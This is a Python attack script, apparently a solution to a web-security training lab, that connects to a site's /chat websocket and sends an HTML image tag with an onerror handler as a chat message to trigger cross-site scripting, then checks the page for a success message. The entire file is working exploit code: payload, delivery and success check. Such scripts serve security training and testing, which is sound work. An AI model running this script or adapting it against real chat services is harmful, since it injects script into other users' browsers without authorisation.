import json
import websocket
import requests
import urllib3
from sys import argv 
import os
import time 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_website_url():
    if len(argv) != 2:
        print(f"[+] usage {argv[0]} <url> ")
        print(f"[+] example {argv[0]} 'http://example.com'")
        exit(-1)
    if argv[1][-1] == '/':
        url = argv[1][:-1]
    else:
        url = argv[1]

    return url


def on_open(ws):
    # Prepare the message payload
    message = { "message" : "<img src onerror='alert(1)' />"}

    # Convert the message payload to JSON
    message_json = json.dumps(message)
    
    # Send the message payload
    ws.send(message_json)


def on_message(ws, message):
    received_message = json.loads(message)
    print('[+] Server response : Received message:', received_message)
    
    # Close the websocket connection after receiving a message
    ws.close()

def exploit(url):
    # Websocket URL
    chat_path = '/chat'
    websocket_url = url.replace("https","ws") + chat_path

    # Create a websocket connection
    ws = websocket.WebSocketApp(websocket_url, on_message=on_message)

    # Register the on_open function to be called when the connection is established
    ws.on_open = on_open

    # Run the websocket connection
    ws.run_forever()

def check_if_attack_successful(url):
    time.sleep(2)
    r = requests.get(url)
    if 'Congratulations' in r.text:
        print("[+] attack successfully")
    else:
        print("[-] attack unsuccessfully")


print("[+] Starting attack")
exploit(get_website_url())
check_if_attack_successful(get_website_url())